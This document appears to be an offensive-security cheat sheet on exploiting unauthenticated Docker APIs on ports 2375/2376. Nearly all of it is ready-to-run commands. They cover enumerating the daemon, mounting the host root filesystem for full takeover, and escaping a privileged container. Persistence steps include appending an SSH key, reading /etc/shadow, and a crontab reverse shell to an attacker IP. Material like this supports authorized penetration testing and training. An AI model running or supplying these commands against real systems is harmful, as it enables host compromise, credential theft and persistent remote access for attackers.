# Docker API (2375, 2376)

!!! tip "Start here"
    Check if the API is unauthenticated: `curl http://10.10.10.10:2375/version`. If it responds, you have full control of the Docker daemon — list containers, pull images, and mount the host filesystem into a new container for a complete host takeover.

!!! warning "Watch out"
    Port 2375 is unencrypted (no TLS). Port 2376 uses TLS but may still lack client cert verification. Try both.

---

## Enumeration

```bash
nmap -p 2375,2376 10.10.10.10
curl http://10.10.10.10:2375/version
curl http://10.10.10.10:2375/containers/json
```

---

## Interact via Docker CLI

Point your local Docker client at the remote daemon:

```bash
export DOCKER_HOST=tcp://10.10.10.10:2375
docker version
docker ps
docker images
```

---

## Host Filesystem Takeover

Mount the host root filesystem into a privileged container:

```bash
docker -H tcp://10.10.10.10:2375 run -it --rm \
  -v /:/mnt/host \
  alpine chroot /mnt/host sh
```

You now have root access to the host filesystem. From here:

```bash
# Add SSH key
echo '<your-public-key>' >> /root/.ssh/authorized_keys

# Read shadow
cat /etc/shadow

# Write a cron job
echo '* * * * * root bash -i >& /dev/tcp/<attacker-ip>/9001 0>&1' >> /etc/crontab
```

---

## Container Escape (Privileged Container)

If you're already inside a container running with `--privileged`:

```bash
# Check if privileged
cat /proc/self/status | grep CapEff

# Mount host disk
fdisk -l
mkdir /mnt/host
mount /dev/sda1 /mnt/host
chroot /mnt/host
```

---

## List and Inspect Running Containers

```bash
docker -H tcp://10.10.10.10:2375 ps -a
docker -H tcp://10.10.10.10:2375 inspect <container-id>
docker -H tcp://10.10.10.10:2375 exec -it <container-id> sh
```

!!! tip "Real-world"
    Unauthenticated Docker API is an immediate critical — it's full host compromise in two commands. It shows up on dev/staging servers where engineers exposed the API for convenience and never locked it down. Always check 2375 on any Linux host running Docker. TLS on 2376 without client cert verification is equally exploitable.
